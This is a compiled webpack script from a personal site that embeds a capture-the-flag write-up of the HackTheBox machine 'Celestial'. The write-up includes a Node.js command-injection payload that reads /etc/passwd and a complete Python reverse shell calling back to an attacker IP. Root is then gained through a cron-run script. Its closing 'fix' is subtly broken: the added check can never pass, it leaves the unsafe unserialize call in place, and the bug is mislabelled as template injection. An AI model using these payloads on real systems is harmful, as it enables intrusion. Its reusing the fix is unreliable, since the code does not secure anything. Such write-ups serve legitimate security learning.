"use strict";(self["webpackChunkpersonal_website"]=self["webpackChunkpersonal_website"]||[]).push([[178],{5114:function(e,t,s){s.r(t),s.d(t,{default:function(){return S}});var r=s(6768),o=s.p+"img/image_1.9866668d.png",n=s.p+"img/image_2.0f226fc9.png",i=s.p+"img/image_3.8c4dbb4d.png",a=s.p+"img/image_4.958c0b5b.png",p=s.p+"img/image_5.61c6c4d1.png",l=s.p+"img/image_6.8ce7741d.png",u=s.p+"img/image_7.46a647f5.png",c=s.p+"img/image_8.7d678ebb.png",m=s.p+"img/image_9.4cc7b774.png",h=s.p+"img/image_10.87792e22.png",d=s.p+"img/image_11.0d1840e6.png",g=s.p+"img/image_12.8e844a1b.png",b=s.p+"img/image_13.deaa1108.png",f=s.p+"img/image_14.d7b9112f.png";const v={class:"component-writeup"},q=(0,r.Fv)('<h1>Recon</h1><h2>Nmap</h2><pre><code>nmap -Pn -v -p- -sV --min-rate 1000 celestial.htb -oN celestial_nmap.txt\n</code></pre><pre><code>PORT     STATE SERVICE VERSION\n3000/tcp open  ppp?\n</code></pre><h1>Initial Foothold and User.txt</h1><p>Main page shows the text “404” on first visit. On subsequent visits the following text is shown. <img src="'+o+'" alt="Screenshots"></p><p>Examining the HTTP header shows a base64 encoded cookie value <img src="'+n+'" alt="Screenshots"></p><p><img src="'+i+'" alt="Screenshots"></p><p>2 of the JSON attributes seems to be reflected on the main page</p><ul><li>username</li><li>num</li></ul><p>The num parameter seems to be concatenated. This is tested by setting num to 3. <img src="'+a+'" alt="Screenshots"></p><p>The server seems to be using templates to reflect these 2 value. By trying the common payload for Server-side Template Injection “{7*7}”, the server evaluated the multiplication provided and printed 49. <img src="'+p+'" alt="Screenshots"></p><p>This proves that SSTI is possible. As an attempt to determine the exact backend framework and template engine used, an error was triggered which returned verbose error message. <img src="'+l+'" alt="Screenshots"> The error message</p><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n&lt;head&gt;\n&lt;meta charset=&quot;utf-8&quot;&gt;\n&lt;title&gt;Error&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;pre&gt;SyntaxError: Unexpected token }&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/sun/server.js:13:29&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/home/sun/node_modules/express/lib/router/route.js:137:13)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at /home/sun/node_modules/express/lib/router/index.js:281:22&lt;br&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)&lt;br&gt; &amp;nbsp; &amp;nbsp;at next (/home/sun/node_modules/express/lib/router/index.js:275:10)&lt;br&gt; &amp;nbsp; &amp;nbsp;at cookieParser (/home/sun/node_modules/cookie-parser/index.js:70:5)&lt;br&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)&lt;/pre&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>From this we can see that:</p><ul><li>The server is running Express Node.js web framework</li><li>There is a user “sun” However, it still doesn’t show what template engine is used.</li></ul><p>A script was made to try perform fuzzing on the num parameter and see if any special characters will trigger the same syntax error. The following is the result:</p><pre><code>-\n.\n&quot;&quot;\n{}\n/\n</code></pre><p>Also some global variables seems to return valid results (e.g. global). <img src="'+u+'" alt="Screenshots"></p><p>Through more googling, the following payload from HackTricks worked, which is intended for the template engine Jade.</p><pre><code>root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;/etc/passwd&#39;]).stdout\n</code></pre><p>Source: <a href="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jade-nodejs">https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jade-nodejs</a></p><p>Output: <img src="'+c+'" alt="Screenshots"></p><p>It was found to be quite difficult to just run a one-line command for reverse shell execution (escaping quotes are painful). So from here the following steps were done to obtain a reverse shell:</p><ol><li>Confirm that python3 is installed on the server (which python3)</li><li>Use <a href="http://revshells.com">revshells.com</a> to create a python reverse shell</li><li>Issue a command to the server to download the reverse shell</li><li>Listen on port 443 (on attacker machine)</li><li>Execute the python reverse shell payload downloaded</li></ol><p>Payload used:</p><pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.73&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)\n</code></pre><p><img src="'+m+'" alt="Screenshots"></p><p>user.txt at /home/sun/user.txt</p><h1>Root.txt</h1><p>On the user’s home directory, there was one file that stood out as it seems to be written by root. <img src="'+h+'" alt="Screenshots"></p><p>There is also another python script that seems to print out the exact words <img src="'+d+'" alt="Screenshots"></p><p>To do a simple test to check if the <a href="http://script.py">script.py</a> was indeed running by root as a background process, the <a href="http://script.py">script.py</a> was modified to print out something different</p><pre><code>print &quot;No it&#39;s not running...&quot;\n</code></pre><p>After 5 minutes, the output.txt file changed to the modified content <img src="'+g+'" alt="Screenshots"> After the first execution, the process is also shown when listing running processes. This shows that the script is indeed ran by root. <img src="'+b+'" alt="Screenshots"></p><p>By using the same python3 reverse shell payload used during initial access (changing connection port to 445), a reverse shell was obtained running as root. <img src="'+f+'" alt="Screenshots"></p><h1>Just for Fun</h1><h2>Try to fix vulnerable server.js script</h2><p>The following is the content of server.js which is the main script of the web server (in /home/sun/server.js).</p><pre><code>var express = require(&#39;express&#39;);\nvar cookieParser = require(&#39;cookie-parser&#39;);\nvar escape = require(&#39;escape-html&#39;);\nvar serialize = require(&#39;node-serialize&#39;);\nvar app = express();\napp.use(cookieParser())\n \napp.get(&#39;/&#39;, function(req, res) {\n if (req.cookies.profile) {\n   var str = new Buffer(req.cookies.profile, &#39;base64&#39;).toString();\n   var obj = serialize.unserialize(str);\n   if (obj.username) { \n     var sum = eval(obj.num + obj.num);\n     res.send(&quot;Hey &quot; + obj.username + &quot; &quot; + obj.num + &quot; + &quot; + obj.num + &quot; is &quot; + sum);\n   }else{\n     res.send(&quot;An error occurred...invalid username type&quot;); \n   }\n}else {\n     res.cookie(&#39;profile&#39;, &quot;eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==&quot;, {\n       maxAge: 900000,\n       httpOnly: true\n     });\n }\n res.send(&quot;&lt;h1&gt;404&lt;/h1&gt;&quot;);\n});\napp.listen(3000);\n</code></pre><p>We can see that the vulnerability lies in <code>var sum = eval(obj.num + obj.num);</code>, where the user input <code>obj.num</code> is directly evaluated without any sanitization.</p><p>The most straightforward way to fix it is to check for the bracket characters <code>{</code> and <code>}</code> and prevent them from passing to <code>eval()</code></p><pre><code>var express = require(&#39;express&#39;);\nvar cookieParser = require(&#39;cookie-parser&#39;);\nvar escape = require(&#39;escape-html&#39;);\nvar serialize = require(&#39;node-serialize&#39;);\nvar app = express();\napp.use(cookieParser())\n \napp.get(&#39;/&#39;, function(req, res) {\n if (req.cookies.profile) {\n   var str = new Buffer(req.cookies.profile, &#39;base64&#39;).toString();\n   var obj = serialize.unserialize(str);\n   if (obj.username &amp;&amp; obj.num.indexOf(&quot;{&quot;) == 0 &amp;&amp; obj.num.indexOf(&quot;}&quot;) == 0) { \n     var sum = eval(obj.num + obj.num);\n     res.send(&quot;Hey &quot; + obj.username + &quot; &quot; + obj.num + &quot; + &quot; + obj.num + &quot; is &quot; + sum);\n   }else{\n     res.send(&quot;An error occurred...invalid username type&quot;); \n   }\n}else {\n     res.cookie(&#39;profile&#39;, &quot;eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==&quot;, {\n       maxAge: 900000,\n       httpOnly: true\n     });\n }\n res.send(&quot;&lt;h1&gt;404&lt;/h1&gt;&quot;);\n});\napp.listen(3000);\n</code></pre>',43),w=[q];function y(e,t){return(0,r.uX)(),(0,r.CE)("div",v,w)}var k=s(1241);const x={},j=(0,k.A)(x,[["render",y]]);var S=j}}]);
//# sourceMappingURL=178.7166f9f1.js.map